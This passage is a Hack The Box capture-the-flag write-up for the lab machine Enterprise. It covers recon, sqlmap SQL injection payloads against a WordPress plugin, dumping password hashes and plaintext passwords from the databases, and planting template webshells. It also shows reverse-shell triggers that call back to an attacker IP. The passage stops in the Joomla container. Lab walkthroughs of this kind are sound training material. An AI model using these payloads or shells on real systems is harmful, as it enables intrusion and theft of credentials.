---
title: HTB: Enterprise
url: https://0xdf.gitlab.io/2021/06/16/htb-enterprise.html
date: 2021-06-16T09:00:00+00:00
difficulty: Medium [30]
os: Linux
tags: htb-enterprise, hackthebox, ctf, nmap, docker, ubuntu, debian, wordpress, joomla, wpscan, feroxbuster, wordpress-plugin, sqli, sqlmap, error-based-sqli, password-reuse, webshell, xinetd, bof, ret2libc, ltrace, ghidra, pattern, checksec, gdb, peda, pwntools, python, htb-frolic
---

![Enterprise](https://0xdfimages.gitlab.io/img/enterprise-cover.png)

To own Enterprise, I’ll have to work through different containers to eventually reach the host system. The WordPress instance has a plugin with available source and a SQL injection vulnerability. I’ll use that to leak creds from a draft post, and get access to the WordPress instance. I can use that to get RCE on that container, but there isn’t much else there. I can also use those passwords to access the admin panel of the Joomla container, where I can then get RCE and a shell. I’ll find a directory mounted into that container that allows me to write a webshell on the host, and get RCE and a shell there. To privesc, I’ll exploit a service with a simple buffer overflow using return to libc. In Beyond Root, I’ll dig more into the Double Query Error-based SQLI.

## Box Info

| Name | [Enterprise](https://hackthebox.com/machines/enterprise)  [Enterprise](https://hackthebox.com/machines/enterprise) [Play on HackTheBox](https://hackthebox.com/machines/enterprise) |
| --- | --- |
| Release Date | [28 Oct 2017](https://twitter.com/hackthebox_eu/status/923181976210825216) |
| Retire Date | 17 Mar 2018 |
| OS | Linux Linux |
| Base Points | Medium [30] |
| Rated Difficulty | Rated difficulty for Enterprise |
| Radar Graph | Radar chart for Enterprise |
| First Blood User | 03:24:13[thegoodbye thegoodbye](https://app.hackthebox.com/users/4446) |
| First Blood Root | 06:22:19[t0nar t0nar](https://app.hackthebox.com/users/13354) |
| Creator | [TheHermit TheHermit](https://app.hackthebox.com/users/1557) |

## Recon

### nmap

`nmap` found four open TCP ports, SSH (22) and HTTP (X):

```

oxdf@parrot$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.61
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-12 14:27 EDT
Nmap scan report for 10.10.10.61
Host is up (0.16s latency).
Not shown: 65305 filtered ports, 226 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
443/tcp  open  https
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 26.10 seconds
oxdf@parrot$ nmap -p 22,80,443,8080 -sCV -oA scans/nmap-tcpscripts 10.10.10.61
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-12 14:28 EDT
Nmap scan report for 10.10.10.61
Host is up (0.11s latency).

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 7.4p1 Ubuntu 10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:e9:8c:c5:b5:52:23:f4:b8:ce:d1:96:4a:c0:fa:ac (RSA)
|   256 f3:9a:85:58:aa:d9:81:38:2d:ea:15:18:f7:8e:dd:42 (ECDSA)
|_  256 de:bf:11:6d:c0:27:e3:fc:1b:34:c0:4f:4f:6c:76:8b (ED25519)
80/tcp   open  http     Apache httpd 2.4.10 ((Debian))
|_http-generator: WordPress 4.8.1
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: USS Enterprise &#8211; Ships Log
443/tcp  open  ssl/http Apache httpd 2.4.25 ((Ubuntu))
|_http-server-header: Apache/2.4.25 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
| ssl-cert: Subject: commonName=enterprise.local/organizationName=USS Enterprise/stateOrProvinceName=United Federation of Planets/countryName=UK
| Not valid before: 2017-08-25T10:35:14
|_Not valid after:  2017-09-24T10:35:14
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
8080/tcp open  http     Apache httpd 2.4.10 ((Debian))
|_http-generator: Joomla! - Open Source Content Management
|_http-open-proxy: Proxy might be redirecting requests
| http-robots.txt: 15 disallowed entries 
| /joomla/administrator/ /administrator/ /bin/ /cache/ 
| /cli/ /components/ /includes/ /installation/ /language/ 
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.20 seconds

```

The [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) and [Apache](https://packages.ubuntu.com/search?keywords=apache2) versions are all mixed up. OpenSSH is version `7.4p1 Ubuntu 10`, but that’s not a default version on [Ubuntu](https://packages.ubuntu.com/search?keywords=openssh-server), but it is on [Debian stretch](https://packages.debian.org/search?keywords=openssh-server). Likewise, TCP 80 and 8080 are showing Apache/2.4.10 Debian, which is the default on [Debian Jessie](https://packages.debian.org/search?keywords=apache2). The HTTPS site (443) is showing a version string that matches the default on [Debian stretch](https://packages.debian.org/search?keywords=apache2), but also says Ubuntu in the output.

It’s not clear what OS Enterprise is, other than it is likely multiple, via some kind of virtualization, likely Docker.

### Website - TCP 80

#### Site

Visiting `http://10.10.10.61` returns a page that doesn’t look right, as if the CSS isn’t loading:

[![image-20210614154048199](https://0xdfimages.gitlab.io/img/image-20210614154048199.png)](https://0xdfimages.gitlab.io/img/image-20210614154048199.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20210614154048199.png)

The page source shows a bunch of references to `enterprise.htb`, and that it’s WordPress:

[![image-20210614154229851](https://0xdfimages.gitlab.io/img/image-20210614154229851.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20210614154229851.png)

I’ll add the domain name to `/etc/hosts`, and then it loads nicely:

[![image-20210614155329408](https://0xdfimages.gitlab.io/img/image-20210614155329408.png)](https://0xdfimages.gitlab.io/img/image-20210614155329408.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20210614155329408.png)

The texts of the posts isn’t too interesting, but I can pull user names off the posts:

![image-20210614155456770](https://0xdfimages.gitlab.io/img/image-20210614155456770.png)

All of the posts are by william.riker.

#### wpscan

Rather than brute force the WP side, I’ll run `wpscan` (using the free API key I got from their site):

```

oxdf@parrot$ wpscan --url http://enterprise.htb --enumerate ap,at,u,tt --api-token $WPSCAN_API
...[snip]...

```

There’s a *ton* of output, but I’ll show the highlights.

There are 51 vulnerabilities identified, which makes sense for an old WP site (looking back later at IppSec’s scan, there were 14 at the time Enterprise retired). Still, none are that interesting. There’s a `$wpdb->prepare()` potential SQLi, but that almost never works without the right plugins. I don’t care about denial of service or open redirects, and I don’t really care about XSS unless I have some indication that there’s a simulated user on the box.

`wpscan` didn’t find any known plugins or Timthumbs.

It only finds the one user identified above:

```

[i] User(s) Identified:

[+] william.riker
 | Found By: Author Posts - Display Name (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] william-riker
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)

```

### Website - TCP 443

#### Site

The site over HTTPS is just the Apache2 Ubuntu default page:

![image-20210614162059019](https://0xdfimages.gitlab.io/img/image-20210614162059019.png)

#### Certificate

Looking at the TLS certificate, there’s the name `enterprise.local`, as well as another user:

![image-20210614162202718](https://0xdfimages.gitlab.io/img/image-20210614162202718.png)

I added `enterprise.local` to `/etc/hosts`, but neither of the domains returned anything but the default page over 443.

#### Directory Brute Force

I’ll run `feroxbuster` against the site:

```

oxdf@parrot$ feroxbuster -u https://10.10.10.61 -k

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.2.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ https://10.10.10.61
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.2.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
301        9l       28w      312c https://10.10.10.61/files
403       11l       32w      300c https://10.10.10.61/server-status
[####################] - 31s    59998/59998   0s      found:2       errors:0      
[####################] - 22s    29999/29999   1330/s  https://10.10.10.61
[####################] - 19s    29999/29999   1556/s  https://10.10.10.61/files

```

It found one interesting path, `/files`.

#### /files

Directory listing is on, and there’s a Zip archive there:

![image-20210614162443998](https://0xdfimages.gitlab.io/img/image-20210614162443998.png)

### Website - TCP 8080

The site is another Star-Trek-related blog:

[![image-20210614162958669](https://0xdfimages.gitlab.io/img/image-20210614162958669.png)](https://0xdfimages.gitlab.io/img/image-20210614162958669.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20210614162958669.png)

Looking at the page source, it’s Joomla:

```

<meta name="generator" content="Joomla! - Open Source Content Management" />

```

I didn’t find much here, and couldn’t log in.

### LCARS - TCP 32812

I can connect to this port with `nc`, and it responds:

```

oxdf@parrot$ nc 10.10.10.61 32812

                 _______ _______  ______ _______
          |      |       |_____| |_____/ |______
          |_____ |_____  |     | |    \_ ______|

Welcome to the Library Computer Access and Retrieval System

Enter Bridge Access Code:

```

Anything I guessed just returned Invalid Code:

```

Enter Bridge Access Code: 
asdasd

Invalid Code
Terminating Console

```

I’ll have to come back to this.

## Recover Passwords

### lcars.zip Analysis

#### Files

The zip file has three files in it:

```

oxdf@parrot$ unzip lcars.zip 
Archive:  lcars.zip
  inflating: lcars/lcars_db.php      
  inflating: lcars/lcars_dbpost.php  
  inflating: lcars/lcars.php         

```

#### On Enterprise

WP plugins are typically zip files, and I can check for the presence of these files in `/wp-content/plugins/[plugin name]/`. That path returns a 403, which is promising:

```

oxdf@parrot$ curl http://enterprise.htb/wp-content/plugins/lcars/
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access /wp-content/plugins/lcars/
on this server.<br />
</p>
<hr>
<address>Apache/2.4.10 (Debian) Server at enterprise.htb Port 80</address>
</body></html>

```

Plugins in WordPress are typically unzipped into `/wp-content/plugins`. I can check each of the files and they exist on Enterprise, but nothing interesting comes back:

```

oxdf@parrot$ curl http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php
Failed to read query 
oxdf@parrot$ curl http://enterprise.htb/wp-content/plugins/lcars/lcars_dbpost.php
Failed to read query 

oxdf@parrot$ curl http://enterprise.htb/wp-content/plugins/lcars/lcars.php

```

#### Source

Looking at the files, `lcars.php` is just metadata and comments about the plugin:

```

<?php
/*
*     Plugin Name: lcars
*     Plugin URI: enterprise.htb
*     Description: Library Computer Access And Retrieval System
*     Author: Geordi La Forge
*     Version: 0.2
*     Author URI: enterprise.htb
*                             */
// Need to create the user interface. 
// need to finsih the db interface
// need to make it secure
?> 

```

`lcars_dbpost.php` takes a GET parameter, `query`, and then uses it to build a database query:

```

<?php
include "/var/www/html/wp-config.php";
$db = new mysqli(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME);
// Test the connection:
if (mysqli_connect_errno()){
    // Connection Error
    exit("Couldn't connect to the database: ".mysqli_connect_error());
}

// test to retireve a post name
if (isset($_GET['query'])){
    $query = (int)$_GET['query'];
    $sql = "SELECT post_title FROM wp_posts WHERE ID = $query";
    $result = $db->query($sql);
    if ($result){
        $row = $result->fetch_row();
        if (isset($row[0])){
            echo $row[0];
        }
    }
} else {
    echo "Failed to read query";
}
?> 

```

The input is cast to an int before it’s used, which will eliminate any injections I might try. I can enumerate the items in the DB:

```

oxdf@parrot$ for i in {0..100}; do echo -n "$i: "; curl -s http://enterprise.htb/wp-content/plugins/lcars/lcars_dbpost.php?query=$i; done | grep . 
0:                   
1: Hello world!      
2:                   
3: Auto Draft 
4: Espresso 
5: Sandwich 
6: Coffee 
7: Home 
8: About 
9: Contact 
10: Blog      
11: A homepage section 
12:           
13: enterprise_header 
14: Espresso   
15: Sandwich 
16: Coffee 
17:  
18:  
19:  
20:  
21:  
22:            
23: enterprise_header 
24: cropped-enterprise_header-1.jpg
25:                                                                                                                                                                                                                                                                             
26:  
27:  
28:  
29:  
30: Home 
31:  
32:  
33:  
34: Yelp 
35: Facebook 
36: Twitter 
37: Instagram 
38: Email 
39:  
40: Hello world! 
41:  
42:  
43:  
44:   
45:                                               
46:  
47:  
48:  
49:  
50:  
51: Stardate 49827.5 
52: Stardate 49827.5 
53: Stardate 50893.5 
54: Stardate 50893.5 
55: Stardate 52179.4 
56: Stardate 52179.4 
57: Stardate 55132.2 
58: Stardate 55132.2 
59:  
60:  
61:  
62:  
63:  
64:  
65:  
66: Passwords 
67: Passwords 
68: Passwords 
69: YAYAYAYAY. 
70: YAYAYAYAY. 
71: test
72:  
73:  
74:  
75:  
76:  
77:  
78: YAYAYAYAY. 
...[snip]...

```

66-68 as Passwords is interesting. But not much else I can do there at this point.

`lcars_db.php` is very similar:

```

<?php
include "/var/www/html/wp-config.php";
$db = new mysqli(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME);
// Test the connection:
if (mysqli_connect_errno()){
    // Connection Error
    exit("Couldn't connect to the database: ".mysqli_connect_error());
}

// test to retireve an ID
if (isset($_GET['query'])){
    $query = $_GET['query'];
    $sql = "SELECT ID FROM wp_posts WHERE post_name = $query";
    $result = $db->query($sql);
    echo $result;
} else {
    echo "Failed to read query";
}

?>

```

But it doesn’t cast the input as an int! It also doesn’t do conversion with the result of the query, just tried to echo it. In fact, this leads the page to break:

```

oxdf@parrot$ curl http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1
<br />
<b>Catchable fatal error</b>:  Object of class mysqli_result could not be converted to string in <b>/var/www/html/wp-content/plugins/lcars/lcars_db.php</b> on line <b>16</b>

```

Where `lcars_dbpost.php` returns “Hello world!”, this errors. That’s because it’s taking the result of the query, which isn’t a string but an object, and trying to pass it to `echo`, which expects a string.

### SQL Injection

#### sqlmap

This is a rather complicated SQL injection, so I’ll let `sqlmap` do the heavy lifting:

```

oxdf@parrot$ sqlmap -u enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1 --batch
...[snip]...
GET parameter 'query' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 297 HTTP(s) requests:
---
Parameter: query (GET)
    Type: boolean-based blind
    Title: Boolean-based blind - Parameter replace (original value)
    Payload: query=(SELECT (CASE WHEN (3821=3821) THEN 1 ELSE (SELECT 3759 UNION SELECT 4044) END))

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: query=1 AND (SELECT 7485 FROM(SELECT COUNT(*),CONCAT(0x716a717871,(SELECT (ELT(7485=7485,1))),0x71627a7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: query=1 AND (SELECT 4649 FROM (SELECT(SLEEP(5)))bNLz)
---
[14:10:54] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 8 (jessie)
web application technology: PHP 5.6.31, Apache 2.4.10
back-end DBMS: MySQL >= 5.0
[14:10:55] [INFO] fetched data logged to text files under '/home/oxdf/.local/share/sqlmap/output/enterprise.htb'

```

It finds three injections, boolean-based blind, error-based, and time-based blind. Blind injections are always going to be slow, as they basically give one bit character per query. I’ll look at how the injection works in [Beyond Root](#beyond-root---error-based-sqli).

#### DB Enum

Start by listing the databases:

```

oxdf@parrot$ sqlmap -u enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1 --batch --dbs
...[snip]...
available databases [8]:
[*] information_schema
[*] joomla
[*] joomladb
[*] mysql
[*] performance_schema
[*] sys
[*] wordpress
[*] wordpressdb
...[snip]...

```

The wordpress DB has 12 tables:

```

oxdf@parrot$ sqlmap -u enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1 --batch -D wordpress --tables
...[snip]...
Database: wordpress              
[12 tables]                                       
+-----------------------+                
| wp_commentmeta        |                         
| wp_comments           |
| wp_links              |
| wp_options            |
| wp_postmeta           |
| wp_posts              |
| wp_term_relationships |
| wp_term_taxonomy      |
| wp_termmeta           |
| wp_terms              |
| wp_usermeta           |
| wp_users              |
+-----------------------+
...[snip]...

```

Dumping `wp_users` gives a hash for william.riker:

```

oxdf@parrot$ sqlmap -u enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1 --batch -D wordpress -T wp_users --dump ...[snip]...
Table: wp_users
[1 entry]
+----+----------+------------------------------------+------------------------------+---------------+-------------+---------------+---------------+---------------------+---------------------+
| ID | user_url | user_pass                          | user_email                   | user_login    | user_status | display_name  | user_nicename | user_registered     | user_activation_key |
+----+----------+------------------------------------+------------------------------+---------------+-------------+---------------+---------------+---------------------+---------------------+
| 1  | <blank>  | $P$BFf47EOgXrJB3ozBRZkjYcleng2Q.2. | william.riker@enterprise.htb | william.riker | 0           | william.riker | william-riker | 2017-09-03 19:20:56 | <blank>             |
+----+----------+------------------------------------+------------------------------+---------------+-------------+---------------+---------------+---------------------+---------------------+
...[snip]...

```

Earlier I used the `lcars_dbpost.php` page to list all the posts in the DB, and there was one called passwords. I’ll dump the `wp_posts` table as well:

```

oxdf@parrot$ sqlmap -u enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1 --batch -D wordpress -T wp_posts --dump
...[snip]...
[14:22:25] [INFO] table 'wordpress.wp_posts' dumped to CSV file '/home/oxdf/.local/share/sqlmap/output/enterprise.htb/dump/wordpress/wp_posts.csv'

```

This prints a huge amount of output that’s difficult to show in the terminal. But it does also write it to a file as a `.csv`, so I can open it in Excel or even just `less -S` (turns off line wraps) to explore it. Or I can remember that it was three posts titled “Passwords” and use `grep`:

```

oxdf@parrot$ grep 'Passwords' ~/.local/share/sqlmap/output/enterprise.htb/dump/wordpress/wp_posts.csv
66,http://enterprise.htb/?p=66,<blank>,<blank>,2017-09-06 15:40:30,<blank>,post,0,Passwords,open,1,0,draft,Needed somewhere to put some passwords quickly\r\n\r\nZxJyhGem4k338S2Y\r\n\r\nenterprisencc170\r\n\r\nZD3YxfnSjezg67JZ\r\n\r\nu*Z14ru0p#ttj83zS6\r\n\r\n \r\n\r\n ,<blank>,0,0000-00-00 00:00:00,2017-09-06 15:40:30,<blank>,open,<blank>,2017-09-06 14:40:30,<blank>
67,http://enterprise.htb/?p=67,<blank>,<blank>,2017-09-06 15:28:35,66-revision-v1,revision,0,Passwords,closed,1,66,inherit,Needed somewhere to put some passwords quickly\r\n\r\nZxJyhGem4k338S2Y\r\n\r\nenterprisencc170\r\n\r\nu*Z14ru0p#ttj83zS6\r\n\r\n \r\n\r\n ,<blank>,0,2017-09-06 14:28:35,2017-09-06 15:28:35,<blank>,closed,<blank>,2017-09-06 14:28:35,<blank>
68,http://enterprise.htb/?p=68,<blank>,<blank>,2017-09-06 15:40:30,66-revision-v1,revision,0,Passwords,closed,1,66,inherit,Needed somewhere to put some passwords quickly\r\n\r\nZxJyhGem4k338S2Y\r\n\r\nenterprisencc170\r\n\r\nZD3YxfnSjezg67JZ\r\n\r\nu*Z14ru0p#ttj83zS6\r\n\r\n \r\n\r\n ,<blank>,0,2017-09-06 14:40:30,2017-09-06 15:40:30,<blank>,closed,<blank>,2017-09-06 14:40:30,<blank>

```

With some `cut` and `sed`, I can get the list of unique passwords:

```

oxdf@parrot$ grep 'Passwords' ~/.local/share/sqlmap/output/enterprise.htb/dump/wordpress/wp_posts.csv | cut -d',' -f14 | sed 's/\\r\\n\\r\\n/\n/g' | sort -u | grep -v quickly
 
enterprisencc170
u*Z14ru0p#ttj83zS6
ZD3YxfnSjezg67JZ
ZxJyhGem4k338S2Y

```

The first line is a space, though I’d be surprised if that is a valid password.

The `joomla` DB doesn’t have any tables, but the `joomladb` table has a ton:

```

oxdf@parrot$ sqlmap -u enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1 --batch -D joomladb --tables
...[snip]...
[72 tables]                      
+-------------------------------+
| edz2g_assets                  |
| edz2g_associations            |
| edz2g_banner_clients          |
| edz2g_banner_tracks           |
...[snip]...

```

The `edz2g_users` table returns two more users:

```

oxdf@parrot$ sqlmap -u enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1 --batch -D joomladb -T edz2g_users --dump
...[snip]...
Database: joomladb
Table: edz2g_users
[2 entries]
+-----+------------+---------+-------+--------------------------------+---------+----------------------------------------------------------------------------------------------+--------------------------------------------------------------+-----------------+-----------+------------+------------+---------------------+--------------+---------------------+---------------------+
| id  | name       | otep    | block | email                          | otpKey  | params                                                                                       | password                                                     | username        | sendEmail | activation | resetCount | registerDate        | requireReset | lastResetTime       | lastvisitDate       |
+-----+------------+---------+-------+--------------------------------+---------+----------------------------------------------------------------------------------------------+--------------------------------------------------------------+-----------------+-----------+------------+------------+---------------------+--------------+---------------------+---------------------+
| 400 | Super User | <blank> | 0     | geordi.la.forge@enterprise.htb | <blank> | {"admin_style":"","admin_language":"","language":"","editor":"","helpsite":"","timezone":""} | $2y$10$cXSgEkNQGBBUneDKXq9gU.8RAf37GyN7JIrPE7us9UBMR9uDDKaWy | geordi.la.forge | 1         | 0          | 0          | 2017-09-03 19:30:04 | 0            | 0000-00-00 00:00:00 | 2017-10-17 04:24:50 |
| 401 | Guinan     | <blank> | 0     | guinan@enterprise.htb          | <blank> | {"admin_style":"","admin_language":"","language":"","editor":"","helpsite":"","timezone":""} | $2y$10$90gyQVv7oL6CCN8lF/0LYulrjKRExceg2i0147/Ewpb6tBzHaqL2q | Guinan          | 0         | <blank>    | 0          | 2017-09-06 12:38:03 | 0            | 0000-00-00 00:00:00 | 0000-00-00 00:00:00 |
+-----+------------+---------+-------+--------------------------------+---------+----------------------------------------------------------------------------------------------+--------------------------------------------------------------+-----------------+-----------+------------+------------+---------------------+--------------+---------------------+---------------------+
...[snip]...

```

I’ll add geordi.la.forge and Guinan to my notes.

## Shell as www-data on WordPress

### wp-admin

To log into the WordPress instance, I’ll visit `http://enterprise.htb/wp-admin`, and it redirects to a login page:

![image-20210615144859825](https://0xdfimages.gitlab.io/img/image-20210615144859825.png)

I have one user name (william.riker) and four passwords. `u*Z14ru0p#ttj83zS6` works:

![image-20210615145023830](https://0xdfimages.gitlab.io/img/image-20210615145023830.png)

### Webshell

One way to get a shell in WordPress is to modify a theme file, since they are written in PHP. On the left menu, Appearance –> Themes –> Editor will bring up the editor:

![image-20210615145238169](https://0xdfimages.gitlab.io/img/image-20210615145238169.png)

On the right, I’ll pick a page to edit. I like the 404 template. I’ll add a webshell right at the top:

![image-20210615145439065](https://0xdfimages.gitlab.io/img/image-20210615145439065.png)

On clicking the Update button, it returns that the page was saved:

![image-20210615145504934](https://0xdfimages.gitlab.io/img/image-20210615145504934.png)

It’s not uncommon to find this edit ability locked out from the web interface, in which case there are other methods to get RCE.

I’ll notice that the first post is `http://enterprise.htb/?p=69`. I’ll change that to `p=169`:

![image-20210615145630660](https://0xdfimages.gitlab.io/img/image-20210615145630660.png)

If I add a parameter, `http://enterprise.htb/?p=169&0xdf=id`, the execution is at the top of the page:

![image-20210615145719704](https://0xdfimages.gitlab.io/img/image-20210615145719704.png)

### Shell

I often show how to go webshell to shell, but it’s also possible to just put it in the PHP:

![image-20210615151513377](https://0xdfimages.gitlab.io/img/image-20210615151513377.png)

Now visiting `enterprise.htb/?p=169&ip=10.10.14.8` triggers a reverse shell back to my host:

```

oxdf@parrot$ nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.8] from (UNKNOWN) [10.10.10.61] 43104
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@b8319d86d21e:/var/www/html$

```

The shell is running as www-data, on a hostname `b8319d86d21e`:

```

www-data@b8319d86d21e:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@b8319d86d21e:/var/www/html$ hostname
b8319d86d21e

```

There’s no Python on this box, but I can get a PTY with `script` and then do the same background `stty` trick:

```

www-data@b8319d86d21e:/var/www/html$ script /dev/null -c bash
script /dev/null -c bash
www-data@b8319d86d21e:/var/www/html$ ^Z      
[1]+  Stopped                 nc -lnvp 443
oxdf@parrot$ stty raw -echo; fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
                                                                         
www-data@b8319d86d21e:/var/www/html$

```

### Docker

There’s a `user.txt` in `/home`, but it’s just a troll:

```

www-data@b8319d86d21e:/home$ cat user.txt 
As you take a look around at your surroundings you realise there is something wrong.
This is not the Enterprise!
As you try to interact with a console it dawns on you.
Your in the Holodeck!

```

There’s a `.dockerenv` file in `/`:

```

www-data@b8319d86d21e:/$ ls -a
.   .dockerenv  boot  etc   lib    media  opt   root  sbin  sys  usr
..  bin         dev   home  lib64  mnt    proc  run   srv   tmp  var

```

It’s clear that I’m in a Docker container, and it’s running Debian 8 jessie:

```

www-data@b8319d86d21e:/$ cat /etc/os-release 
PRETTY_NAME="Debian GNU/Linux 8 (jessie)"
NAME="Debian GNU/Linux"
VERSION_ID="8"
VERSION="8 (jessie)"
ID=debian
HOME_URL="http://www.debian.org/"
SUPPORT_URL="http://www.debian.org/support"
BUG_REPORT_URL="https://bugs.debian.org/"

```

This container is pretty empty, other than the WordPress stuff. The DB connection config is in `/var/www/html/wp-config.php`:

```

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */                       
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', 'NCC-1701E');                                 

/** MySQL hostname */
define('DB_HOST', 'mysql');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8');

/** The Database Collate type. Don't change this if in doubt. */    
define('DB_COLLATE', '');  

```

The `DB_HOST` is `mysql`. `ping` shows the IP for that host:

```

www-data@b8319d86d21e:/var/www/html$ ping -c 1 mysql
PING mysql (172.17.0.2): 56 data bytes
64 bytes from 172.17.0.2: icmp_seq=0 ttl=64 time=0.056 ms
--- mysql ping statistics ---
1 packets transmitted, 1 packets received, 0% packet loss
round-trip min/avg/max/stddev = 0.056/0.056/0.056/0.000 ms

```

The local IP is 172.17.0.4. A super quick `ping` sweep shows four hosts on this network:

```

www-data@b8319d86d21e:/$ for i in {1..254}; do (ping -c 1 172.17.0.${i} | grep "bytes from" | grep -v "Unreachable" &); done;
64 bytes from 172.17.0.1: icmp_seq=0 ttl=64 time=1.755 ms
64 bytes from 172.17.0.2: icmp_seq=0 ttl=64 time=0.563 ms
64 bytes from 172.17.0.3: icmp_seq=0 ttl=64 time=0.547 ms
64 bytes from 172.17.0.4: icmp_seq=0 ttl=64 time=0.870 ms

```

At this point fair to guess:

```

.1 == host
.2 == mysql
.3 == joomla? or maybe HTTPS site?
.4 == WordPress

```

## Shell as www-data on Joomla

### Log In

I have two usernames from the SQL injection, geordi.la.forge and Guinan. It turns out that each of their passwords is in the list I pulled from the draft post. Using Guinan / ZxJyhGem4k338S2Y logs in as Guinan:

![image-20210615160232293](https://0xdfimages.gitlab.io/img/image-20210615160232293.png)

Logging in with geordi.la.forge / ZD3YxfnSjezg67JZ grants access as Super User:

![image-20210615160154206](https://0xdfimages.gitlab.io/img/image-20210615160154206.png)

The Joomla admin panel is at `/administrator`, and the geordi creds work:

![image-20210615160515063](https://0xdfimages.gitlab.io/img/image-20210615160515063.png)

In the menus I’ll go to Extensions –> Templates –> Templates to see the installed templates:

![image-20210615161159961](https://0xdfimages.gitlab.io/img/image-20210615161159961.png)

### Modify Template

A little trial and error shows that Protostar is the template in user. Clicking on it takes me to the editor with a list of files:

![image-20210615162333576](https://0xdfimages.gitlab.io/img/image-20210615162333576.png)

I’ll add a reverse shell to `error.php`:

![image-20210615162529723](https://0xdfimages.gitlab.io/img/image-20210615162529723.png)

Now I’ll click save.

### Trigger Shell

I need a page that doesn’t exist, so I’ll just add `0xdf` to the end of the `index.php` url and add the IP to get `http://10.10.10.61:8080/index.php/0xdf?ip=10.10.14.8`. On visiting in Firefox, I get a shell:

```

oxdf@parrot$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.8] from (UNKNOWN) [10.10.10.61] 33704
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@a7018bfdc454:/var/www/html$ 

```

I’ll upgrade the shell with `script` just like before.

`/home/user.txt` is the same as before.

### Docker

This is also a Docker container, and it has the IP 172.17.0.3, confirming my guess from above.

```

www-data@a7018bfdc454:/home$ ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
6: eth0@if7: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:ac:11:00:03 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.3/16 scope global eth0
       valid_lft forever preferred_lft forever

```

## Shell as www-data on Host

### Enumeration

This container is also pretty empty. In the web folders, one thing jumped out:

```

www-data@a7018bfdc454:/var/www/html$ ls -l
total 16976
-rw-r--r--  1 www-data www-data   18092 Aug 14  2017 LICENSE.txt
-rw-r--r--  1 www-data www-data    4874 Aug 14  2017 README.txt
drwxr-xr-x 11 www-data www-data    4096 Aug 14  2017 administrator
drwxr-xr-x  2 www-data www-data    4096 Aug 14  2017 bin
